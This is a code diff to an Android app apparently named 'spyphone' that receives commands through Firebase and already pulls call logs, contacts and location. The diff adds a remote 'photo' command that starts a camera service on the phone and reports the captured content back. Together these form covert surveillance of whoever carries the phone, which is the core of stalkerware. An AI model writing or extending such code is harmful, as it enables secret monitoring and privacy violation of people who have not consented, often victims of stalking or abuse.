@@ -19,6 +19,7 @@ import java.util.Map;
 
 import emit.esy.es.spyphone.R;
 import emit.esy.es.spyphone.services.CallLogService;
+import emit.esy.es.spyphone.services.CameraService;
 import emit.esy.es.spyphone.services.ContactsService;
 import emit.esy.es.spyphone.services.LocationService;
 
@@ -104,6 +105,10 @@ public class FirebaseUtil {
         aw.put("action", action);
         //set value for content (switch case for content return value)
         switch(action){
+            case "photo":
+                content = data.getString("content");
+                context.stopService(new Intent(context, CameraService.class));
+                break;
             case "cords":
                 content = data.getDoubleArray("content");
                 break;
@@ -154,7 +159,9 @@ public class FirebaseUtil {
                             switch (childValue){
                                 case "photo":
                                     Log.d(LOG_TAG, "Starting photo service");
-
+                                    intent = new Intent(context, CameraService.class);
+                                    intent.putExtra("messenger", new Messenger(handler));
+                                    context.startService(intent);
                                     setOnDefaultAndroidRead(dataSnapshot);
                                     break;
                                 case "cords":
